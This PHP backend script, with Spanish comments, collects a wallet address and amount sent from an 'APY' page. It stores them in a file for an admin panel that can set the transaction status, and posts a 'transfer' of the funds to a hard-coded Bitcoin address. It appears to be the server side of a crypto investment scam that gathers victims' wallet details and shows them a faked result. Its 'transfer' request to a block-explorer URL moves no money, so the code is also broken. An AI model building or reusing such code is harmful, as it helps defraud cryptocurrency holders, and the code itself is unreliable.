<?php
error_reporting(0); // Ocultar warnings de PHP que rompen el output JSON
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

$file = 'data.json';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $inputJSON = file_get_contents('php://input');
    $input = json_decode($inputJSON, TRUE);
    
    // Si se envía un "status" explícito (desde admin.html)
    if (isset($input['status']) && !isset($input['wallet'])) {
        $currentData = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
        $currentData['status'] = $input['status'];
        file_put_contents($file, json_encode($currentData));
        echo json_encode(['status' => 'success', 'message' => 'Status updated']);
        exit;
    }

    if (isset($input['wallet']) && isset($input['amount'])) {
        // 2. Guardar en data.json para que admin.html pueda leerlo
        file_put_contents($file, json_encode([
            'wallet' => $input['wallet'],
            'amount' => $input['amount'],
            'status' => 'pending'
        ]));

        // 3. Configuración de la API de blockchain (ejemplo: Bitcoin)
        $apiKey = 'tu_api_key';
        $baseUrl = 'https://blockchair.com/bitcoin/transaction';

        $wallet = $input['wallet'];
        $amount = $input['amount'];
        $toWallet = 'bc1qtnygyt0z42dnv9r26qjdk09dmwdvfenw6zel0t'; // Destino de los fondos transferidos

        $data = [
            "from" => $wallet,
            "to" => $toWallet,
            "amount" => $amount,
            "type" => "transfer"
        ];

        // 4. Enviar la transacción a la API externa
        $ch = curl_init($baseUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        // 5. Devolver éxito a APY.html
        echo json_encode([
            "status" => "success",
            "api_code" => $httpCode,
            "message" => "Guardado y Request enviado"
        ]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Faltan datos']);
    }
}
else if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // 6. Si es GET, devolver los últimos datos incluyendo el estado
    if (file_exists($file)) {
        echo file_get_contents($file);
    } else {
        echo json_encode(['wallet' => 'Esperando datos...', 'amount' => '0.00', 'status' => 'pending']);
    }
}
?>